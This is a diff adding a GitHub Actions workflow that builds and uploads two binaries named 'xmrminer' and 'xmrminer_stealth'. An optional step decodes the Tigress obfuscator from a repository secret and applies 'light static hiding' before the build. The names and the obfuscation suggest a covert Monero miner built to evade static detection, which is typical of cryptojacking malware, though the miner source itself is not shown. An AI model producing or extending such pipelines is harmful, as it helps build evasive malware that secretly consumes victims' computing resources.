@@ -1,0 +1,48 @@
+name: build
+on:
+  workflow_dispatch:
+  push:
+    branches: [ main, master ]
+
+jobs:
+  build:
+    runs-on: ubuntu-22.04
+    timeout-minutes: 120
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: deps
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential cmake python3 git pkg-config libssl-dev zlib1g-dev libzstd-dev
+
+      - name: optional tigress (light static hiding)
+        if: ${{ secrets.TIGRESS_TGZ_B64 != '' }}
+        env:
+          TIGRESS_TGZ_B64: ${{ secrets.TIGRESS_TGZ_B64 }}
+        run: |
+          echo "$TIGRESS_TGZ_B64" | base64 -d > /tmp/tigress.tgz
+          mkdir -p /tmp/tigress && tar -xzf /tmp/tigress.tgz -C /tmp/tigress
+          TIGRESS_BIN=$(find /tmp/tigress -type f -name tigress | head -1)
+          chmod +x "$TIGRESS_BIN"
+          sudo ln -sf "$TIGRESS_BIN" /usr/local/bin/tigress
+          /usr/local/bin/tigress --version | head -5 || true
+          python3 scripts/tigress_light.py
+
+      - name: build
+        run: |
+          make clean || true
+          make -j4
+
+      - name: verify (no run)
+        run: |
+          file ./xmrminer ./xmrminer_stealth || true
+          sha256sum ./xmrminer ./xmrminer_stealth || true
+
+      - name: upload
+        uses: actions/upload-artifact@v4
+        with:
+          name: xmrminer-linux-x86_64
+          path: |
+            xmrminer
+            xmrminer_stealth
